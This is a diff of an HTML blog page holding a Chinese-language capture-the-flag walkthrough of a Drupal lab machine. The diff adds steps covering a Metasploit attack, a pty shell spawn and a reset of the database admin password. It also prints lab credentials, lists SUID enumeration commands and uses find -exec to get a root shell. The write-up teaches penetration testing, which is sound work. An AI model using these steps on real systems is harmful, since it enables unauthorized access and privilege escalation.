@@ -168,10 +168,16 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2021-09-27 21:14:24 / 修改时间：21:15:02" itemprop="dateCreated datePublished" datetime="2021-09-27T21:14:24+08:00">2021-09-27</time>
+              <time title="创建时间：2021-09-27 21:14:24" itemprop="dateCreated datePublished" datetime="2021-09-27T21:14:24+08:00">2021-09-27</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-10-05 20:50:23" itemprop="dateModified" datetime="2021-10-05T20:50:23+08:00">2021-10-05</time>
+              </span>
 
           
 
@@ -192,8 +198,12 @@
 <blockquote>
 <p>nnap -sS -v 192.168.111.130</p>
 </blockquote>
-<p><img src="https://img-blog.csdnimg.cn/a446bbbe52ca478bbf314259e384944a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAYmFpeWV4aW5nOA==,size_17,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述">查看80端口<br><img src="https://img-blog.csdnimg.cn/73d7d50724444b5e8afbb914cd0968e1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAYmFpeWV4aW5nOA==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述">二.漏洞利用<br>msf攻击<br><img src="https://img-blog.csdnimg.cn/6f8604ab863042f1836b63a435c6b196.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAYmFpeWV4aW5nOA==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br><img src="https://img-blog.csdnimg.cn/77e6fc462a5b4402b1502da4d59ea089.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAYmFpeWV4aW5nOA==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br>拿到meterpreter以后查看当前目录，发现flag1.txt,cat得到flag1</p>
-<p><img src="https://img-blog.csdnimg.cn/a3e0e6faa61f40bb9ada90420aff7822.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAYmFpeWV4aW5nOA==,size_18,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br>根据flag1的提示百度，得到Drupal的数据库配置文件在sites/default/settings.php<br><img src="https://img-blog.csdnimg.cn/29b334365aa54da28e3ccdd97457e6c9.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAYmFpeWV4aW5nOA==,size_19,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述">cat setting.php得到flag2.txt<br><img src="https://img-blog.csdnimg.cn/dd76dde38f694a81b2e8d22fa7de3845.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAYmFpeWV4aW5nOA==,size_14,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br>接下来可以从mysql入手，先溢出提权，得到一个交互式shell</p>
+<p><img src="https://img-blog.csdnimg.cn/a446bbbe52ca478bbf314259e384944a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAYmFpeWV4aW5nOA==,size_17,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述">查看80端口</p>
+<p><img src="https://img-blog.csdnimg.cn/73d7d50724444b5e8afbb914cd0968e1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAYmFpeWV4aW5nOA==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述">二.漏洞利用<br>msf攻击</p>
+<p><img src="https://img-blog.csdnimg.cn/6f8604ab863042f1836b63a435c6b196.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAYmFpeWV4aW5nOA==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br><img src="https://img-blog.csdnimg.cn/77e6fc462a5b4402b1502da4d59ea089.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAYmFpeWV4aW5nOA==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br>拿到meterpreter以后查看当前目录，发现flag1.txt,cat得到flag1</p>
+<p><img src="https://img-blog.csdnimg.cn/a3e0e6faa61f40bb9ada90420aff7822.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAYmFpeWV4aW5nOA==,size_18,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br>根据flag1的提示百度，得到Drupal的数据库配置文件在sites/default/settings.php</p>
+<p><img src="https://img-blog.csdnimg.cn/29b334365aa54da28e3ccdd97457e6c9.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAYmFpeWV4aW5nOA==,size_19,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述">cat setting.php得到flag2.txt</p>
+<p><img src="https://img-blog.csdnimg.cn/dd76dde38f694a81b2e8d22fa7de3845.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAYmFpeWV4aW5nOA==,size_14,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br>接下来可以从mysql入手，先溢出提权，得到一个交互式shell</p>
 <blockquote>
 <p>python -c ‘import pty;pty.spawn(“/bin/sh”)’</p>
 </blockquote>
@@ -201,7 +211,34 @@
 <blockquote>
 <p>mysql -udbuser -pR0ck3t</p>
 </blockquote>
-<p><img src="https://img-blog.csdnimg.cn/08758b6fdea04bec905ddb7b9e72639f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAYmFpeWV4aW5nOA==,size_19,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br>接下来show库show表<img src="https://img-blog.csdnimg.cn/7e17e76a39c441e6812934dd43336375.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAYmFpeWV4aW5nOA==,size_16,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br>在show表的时候发现users表<br><img src="https://img-blog.csdnimg.cn/61470950b1b64256a6da1696f2e3a5fc.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAYmFpeWV4aW5nOA==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/08758b6fdea04bec905ddb7b9e72639f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAYmFpeWV4aW5nOA==,size_19,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br>接下来show库show表<br><img src="https://img-blog.csdnimg.cn/7e17e76a39c441e6812934dd43336375.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAYmFpeWV4aW5nOA==,size_16,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br>在show表的时候发现users表</p>
+<p><img src="https://img-blog.csdnimg.cn/61470950b1b64256a6da1696f2e3a5fc.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAYmFpeWV4aW5nOA==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"></p>
+<p>发现用户密码被hash加密了，百度查找后了解到Drupal的加密脚本在根目录的scripts中，可以生成一个密码来重置管理员密码。<br>加密脚本</p>
+<blockquote>
+<p>./scripts/password-hash.sh 333333</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/c0e14b63b42f40ecba5f408e3483dfd0.png" alt="请添加图片描述"></p>
+<p>更新管理员密码</p>
+<p><img src="https://img-blog.csdnimg.cn/6c85b659f7cd435f943016d6cef2c089.png" alt="请添加图片描述"><br>接下来就可以用密码登录网站了，在content中找到flag3</p>
+<p><img src="https://img-blog.csdnimg.cn/cddaa49c228042c787a415895ffa261b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAYmFpeWV4aW5nOA==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br>发现关键词passwd，进入ect目录查看，果然有passwd</p>
+<p><img src="https://img-blog.csdnimg.cn/16f8df12d9c3443481846f5c80d8ec94.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAYmFpeWV4aW5nOA==,size_17,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br>打开发现flag4在home目录中，进入/home/flag4目录中找到flag4.txt文件</p>
+<p><img src="https://img-blog.csdnimg.cn/d20a28e9d8784c7e8e4a7319474d34b2.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAYmFpeWV4aW5nOA==,size_16,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br>刚开始看了flag4提示没有头绪，后来看了其他大佬的wp才知道能用suid提权</p>
+<blockquote>
+<p>suid的作用：用于执行文件，以文件的拥有者的身份运行该文件。     chmod u+s  文件名</p>
+</blockquote>
+<p>以下命令可以发现系统上运行的所有SUID可执行文件。</p>
+<blockquote>
+<p> find / -perm -u=s -type f 2&gt;/dev/null<br> find / -user root -perm-4000 -print 2&gt;/dev/null<br>    find / -user root -perm -4000 -exec ls -ldb {} ;</p>
+</blockquote>
+<p>发现find命令有root权限</p>
+<p><img src="https://img-blog.csdnimg.cn/58fdf228bbcb43d48a50b4e67d257009.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAYmFpeWV4aW5nOA==,size_12,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"></p>
+<p>用find提权,成功获得root权限</p>
+<blockquote>
+<p>find / name flag4 -exec “/bin/sh” ;</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/49bc72c3d860401aaefdf4b1352d0de8.png" alt="请添加图片描述"></p>
+<p>打开root目录发现最后一个flag</p>
+<p><img src="https://img-blog.csdnimg.cn/5957076410d74b2aada0b10fd7dc29cb.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAYmFpeWV4aW5nOA==,size_14,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"></p>
 
       
     </div>
